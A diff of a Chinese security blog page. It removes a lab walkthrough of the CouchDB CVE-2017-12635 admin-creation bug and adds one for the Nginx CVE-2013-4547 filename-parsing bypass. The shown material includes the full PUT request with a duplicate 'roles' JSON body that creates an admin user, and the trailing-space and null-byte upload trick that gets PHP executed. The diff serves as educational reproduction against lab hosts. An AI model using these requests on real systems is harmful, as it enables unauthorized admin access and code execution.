@@ -16,9 +16,9 @@
   
   
   
-    <meta name="description" content="漏洞原理：Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。在2017年11月...">
+    <meta name="description" content="Nginx 文件名逻辑漏洞（CVE-2013-4547）&emsp;影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7漏洞原理：这个漏洞其实与代码执行没有太大关系，其主要原因是错误的解析了URL，错误地获取到用户请求的文件名，导致出现权限绕过，代码执行等连带影响。nginx不支持对外部程序的直接调用或解析，所有的外部程序（包括PHP）必须通过fastcgi接口...">
   
-  <title>CouchDB 未授权访问漏洞CVE-2017-12635 [ liu ]</title>
+  <title>Nginx 文件名逻辑漏洞（CVE-2013-4547） [ liu ]</title>
   
   
     <link rel="shortcut icon" href="/hollow.ico">
@@ -38,21 +38,21 @@
 <div class="side-navigate hide-area">
   
     <div class="item prev">
-      <a href="/2019/07/10/1 day/9/">
+      <a href="/2019/07/20/1 day/6/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        Nginx 文件名逻辑漏洞（CVE-2013-4547）
+        Drupal 小于7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）
       </div>
     </div>
   
   
     <div class="item next">
-      <a href="/2019/07/05/1 day/7/">
+      <a href="/2019/07/10/1 day/2/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        DNS域传送漏洞
+        CouchDB 未授权访问漏洞CVE-2017-12635
       </div>
     </div>
   
@@ -129,11 +129,11 @@
   
 
   <article id="post">
-    <h1>CouchDB 未授权访问漏洞CVE-2017-12635</h1>
+    <h1>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h1>
     <p class="page-title-sub">
       <span id="post-title-date">Created at 2019-07-10</span>
       
-        <span id="post-title-updated">Updated at 2019-08-03</span>
+        <span id="post-title-updated">Updated at 2019-08-05</span>
       
       
       <span id="post-title-categories">Category
@@ -152,27 +152,13 @@
       
         
         
-        <a href="/tags/CouchDB-未授权访问漏洞CVE-2017-12635/">CouchDB 未授权访问漏洞CVE-2017-12635</a>
+        <a href="/tags/Nginx-文件名逻辑漏洞（CVE-2013-4547）/">Nginx 文件名逻辑漏洞（CVE-2013-4547）</a>
       
       </span>
       
     </p>
     
-    <hr>
-<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br>&emsp;<br>影响版本：小于 1.7.0 以及 小于 2.1.1<br>&emsp;<br>&emsp;</p>
-<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>靶机：192.168.199.217:5984<br>攻击者：192.168.199.187</p>
-<ol>
-<li>首先访问一下靶机</li>
-</ol>
-<p><a href="https://imgchr.com/i/eBTdC8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBTdC8.png" alt="eBTdC8.png"></a><br>暴漏出couchdb的版本信息等<br>访问<a href="http://192.168.199.151:5984/_utils/" target="_blank" rel="noopener">http://192.168.199.151:5984/_utils/</a></p>
-<p><a href="https://imgchr.com/i/eBHJtP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBHJtP.png" alt="eBHJtP.png"></a><br>选择登陆账户：admin，密码：password<br>登陆进去可以看到别人创建的用户密码等数据库<br>&emsp;<br>&emsp;</p>
-<ol start="2">
-<li>使用burpsuite进行抓包并修改请求内容</li>
-</ol>
-<p><a href="https://imgchr.com/i/eBqKZd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBqKZd.png" alt="eBqKZd.png"></a><br>修改请求为PUT并创建用户和密码，在user这个数据库中创建账号和密码<br>PUT /_users/org.couchdb.user:liupanpan HTTP/1.1<br>Host: 192.168.199.217:5984<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>If-Modified-Since: Sat, 02 Dec 2017 17:49:09 GMT<br>Connection: close<br>Content-Length: 108</p>
-<p>{<br>  “type”: “user”,<br>  “name”: “liupanpan”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “lpp”<br>}</p>
-<p><a href="https://imgchr.com/i/eBqNLQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBqNLQ.png" alt="eBqNLQ.png"></a><br>&emsp;<br>访问下图页面</p>
-<p><a href="https://imgchr.com/i/eBqrWV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBqrWV.png" alt="eBqrWV.png"></a><br>发现创建成功<br>&emsp;<br>&emsp;</p>
+    <h1 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h1><p>&emsp;<br>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<br>漏洞原理：这个漏洞其实与代码执行没有太大关系，其主要原因是错误的解析了URL，错误地获取到用户请求的文件名，导致出现权限绕过，代码执行等连带影响。<br>nginx不支持对外部程序的直接调用或解析，所有的外部程序（包括PHP）必须通过fastcgi接口来调用，fastcgi接口在Linux下是socket（这个socket可以是文件socket，也可以是ip socket）。是因为有fastcgi所以nginx才能解析PHP<br>&emsp;<br>&emsp;<br>靶机：192.168.110.216:8082<br>&emsp;<br>1.访问靶机<br><a href="http://192.168.110.216:8082/（这里8082是我自己修改的本身端口为8080）" target="_blank" rel="noopener">http://192.168.110.216:8082/（这里8082是我自己修改的本身端口为8080）</a><br>访问靶机，就是一个文件上传页面<br><a href="https://imgchr.com/i/eg8j8f" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/eg8j8f.png" alt="eg8j8f.png"></a><br>&emsp;<br>&emsp;<br>2.写一个phpinfo命名为3.php<br><?php phpinfo();?><br>进行上传3.php，发现不能上传PHP文件。（这里设置了黑名单）<br><a href="https://imgchr.com/i/egGSKg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egGSKg.png" alt="egGSKg.png"></a><br>&emsp;<br>&emsp;<br>这时使用burp进行拦截，拦截上传的流量<br><a href="https://imgchr.com/i/egGAP0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egGAP0.png" alt="egGAP0.png"></a><br>修改请求内容<br><a href="https://imgchr.com/i/egGDit" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egGDit.jpg" alt="egGDit.jpg"></a><br>在这里把文件名改为999.gif空格，注意文件名后面有一个空格<br>右边显示上传成功，并显示出路径<br>在网页上访问999.gif<br><a href="http://192.168.110.216:8082/uploadfiles/999.gif" target="_blank" rel="noopener">http://192.168.110.216:8082/uploadfiles/999.gif</a><br><a href="https://imgchr.com/i/egGyz8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egGyz8.png" alt="egGyz8.png"></a><br>&emsp;<br>&emsp;<br>3.通过访问<a href="http://192.168.110.216:8082/uploadfiles/999.gif.php" target="_blank" rel="noopener">http://192.168.110.216:8082/uploadfiles/999.gif.php</a><br>使用burp进行抓包<br><a href="https://imgchr.com/i/egG2LQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egG2LQ.png" alt="egG2LQ.png"></a><br>修改hex值，找到对应的999.gif.php在999.gif后面加上20和00<br><a href="https://imgchr.com/i/egG5iq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egG5iq.png" alt="egG5iq.png"></a><br>注意，[0x20]是空格，[0x00]是\0，这两个字符都不需要编码。</p>
 
   </article>
   <div class="random-toc-area">
@@ -180,20 +166,20 @@
   <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
   <div class="random-toc">
     <h2>Table of Content</h2>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）"><span class="toc-text">Nginx 文件名逻辑漏洞（CVE-2013-4547）</span></a></li></ol>
   </div>
 </div>
 
   
 <nav id="pagination">
   
-    <a href="/2019/07/10/1 day/9/" class="prev">&larr; Prev post Nginx 文件名逻辑漏洞（CVE-2013-4547）</a>
+    <a href="/2019/07/20/1 day/6/" class="prev">&larr; Prev post Drupal 小于7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</a>
   
 
   
 
   
-    <a href="/2019/07/05/1 day/7/" class="next">Next post DNS域传送漏洞 &rarr;</a>
+    <a href="/2019/07/10/1 day/2/" class="next">Next post CouchDB 未授权访问漏洞CVE-2017-12635 &rarr;</a>
   
 </nav>
 
